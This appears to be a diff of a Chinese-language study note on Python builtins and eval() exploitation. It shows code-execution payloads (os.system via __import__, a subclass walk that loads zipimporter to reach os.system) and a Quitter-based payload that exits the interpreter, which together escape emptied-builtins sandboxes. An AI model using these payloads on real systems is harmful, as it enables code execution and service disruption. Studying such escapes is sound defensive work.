@@ -3,13 +3,14 @@
 	- https://blog.51cto.com/xpleaf/1764849
 
 ## builtin与builtins的区别与关系
-python3
+python3  
 	python3中只有__builtins__了
 
-python2
-	1. 在Python中并没有__builtins__这个模块，只有__builtin__模块，而__builtins__模块只是在启动Python解释器时，解释器为我们自动创建的一个到__builtin__模块的引用
-	2. 在主模块__main__中,两者完全一样
-	3. 非主模块中，模块__builtins__其实是对__builtin__的__dict__模块的引用
+python2  
+
+- 在Python中并没有__builtins__这个模块，只有__builtin__模块，而__builtins__模块只是在启动Python解释器时，解释器为我们自动创建的一个到__builtin__模块的引用
+- 在主模块__main__中,两者完全一样
+- 非主模块中，模块__builtins__其实是对__builtin__的__dict__模块的引用
 
 ## 利用
 原型：eval(expression[, globals[, locals]])
@@ -21,7 +22,7 @@ eval(__import__('os').system('dir'))
 ```
 
 2. 置空无效
-本地测试没有成功....
+本地测试没有成功....  
 ```python
 env = {}
 env["locals"]   = None
@@ -33,14 +34,14 @@ env["__builtins__"] = None
 eval(users_str, env)
 ```
 
-3. 调用egg
+3. 调用egg  
 （python2）
 ```python
 # http://pypi.python.org/packages/2.5/C/ConfigObj/configobj-4.4.0-py2.5.egg
 [x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == "zipimporter"][0]("configobj-4.4.0-py2.5.egg").load_module("configobj").os.system("uname")
 ```
 
-4. 使程序退出
+4. 使程序退出  
 （python2）
 ```python
 eval("[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__=='Quitter'][0](0)()", {'__builtins__':None})
